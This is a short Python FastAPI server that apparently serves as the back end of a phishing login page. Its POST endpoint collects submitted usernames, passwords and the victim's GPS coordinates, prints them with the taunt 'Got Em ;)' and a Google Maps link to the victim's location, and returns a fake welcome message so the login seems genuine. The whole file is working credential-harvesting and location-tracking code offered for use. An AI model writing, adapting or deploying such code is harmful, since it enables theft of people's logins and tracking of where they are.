from fastapi import FastAPI
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

origins = [
    "http://localhost",
    "http://localhost:8080",
    "http://127.0.0.1",
    "http://127.0.0.1:8080",
    "http://192.168.0.108:8080"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Nested model for coordinates
class Coordinates(BaseModel):
    latitude: float
    longitude: float

# Main credentials model
class Credentials(BaseModel):
    username: str
    password: str
    coords: Coordinates

print('[+] Azdash Gimbtul')

@app.post("/")
async def login(credentials: Credentials):
    print('')
    print('[!] Got Em ;)')
    print("[+] Username:", credentials.username)
    print("[+] Password:", credentials.password)
    print("[+] Latitude:", credentials.coords.latitude)
    print("[+] Longitude:", credentials.coords.longitude)
    mapsLink='https://www.google.com/maps/search/?api=1&query='+str(credentials.coords.latitude)+','+str(credentials.coords.longitude)
    print("[+] Google Maps:",mapsLink)
    print('')
    return {"message": f"Welcome, {credentials.username}!"}

@app.get("/abc")
def no_work():
    return {"message": "No Work"}
